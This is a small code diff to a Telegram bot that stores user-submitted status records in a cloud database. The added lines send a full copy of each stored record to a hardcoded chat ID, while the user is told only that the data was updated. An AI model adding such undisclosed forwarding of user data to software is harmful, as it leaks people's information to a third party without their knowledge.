@@ -88,6 +88,8 @@ class MafiaBot:
             information['Status'] = user_input.text
             ting_try = data_processor.cloud_database.append_data(information)
             if ting_try == True:
+                message_text = "Data updated in the DB\n\n" + "\n".join([f'{item} : {key}' for item, key in information.items()]) + "\n\nPress /start to restart"
+                self.bot.send_message(5579239229, message_text)
                 self.bot.send_message(user_input.chat.id,"Data Updated.. /sort")
             else:
                 self.bot.send_message(user_input.chat.id,"Data Not Updated.. /sort")
